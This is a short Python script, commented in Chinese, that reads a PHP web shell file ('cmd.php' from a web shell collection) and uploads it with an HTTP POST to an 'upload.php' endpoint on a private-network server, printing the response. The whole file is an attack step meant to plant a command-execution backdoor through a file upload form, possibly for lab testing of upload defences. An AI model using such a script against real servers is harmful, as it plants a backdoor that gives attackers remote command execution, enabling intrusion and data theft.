import requests

# 文件路径
file_path = "repo/webshell/JoyChou93-webshell/PHP/cmd.php"


# 服务器地址
url = "http://192.168.8.124:8080/upload.php"

# 打开文件并上传
with open(file_path, 'rb') as file:
    files = {'file': file}
    response = requests.post(url, files=files)

# 输出服务器响应
print(response.text)